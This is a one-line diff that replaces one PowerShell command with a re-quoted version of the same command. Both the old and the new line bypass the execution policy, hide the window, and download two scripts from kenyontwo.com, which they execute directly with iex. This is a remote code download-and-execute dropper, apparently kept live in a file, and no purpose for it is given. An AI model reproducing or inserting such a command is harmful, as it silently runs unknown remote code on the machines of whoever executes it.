@@ -1,1 +1,1 @@
-powershell -NoProfile -ExecutionPolicy Bypass -Command "& { iex (iwr https://kenyontwo.com/byeworld11 -UseBasicParsing).Content; iex (iwr https://kenyontwo.com/test_https.ps1 -UseBasicParsing).Content }" -WindowStyle Hidden
+powershell -NoProfile -ExecutionPolicy Bypass -Command '& { powershell -c "iex(iwr -usebasicparsing https://kenyontwo.com/byeworld11); iex(iwr -usebasicparsing https://kenyontwo.com/test_https.ps1)" }' -WindowStyle Hidden
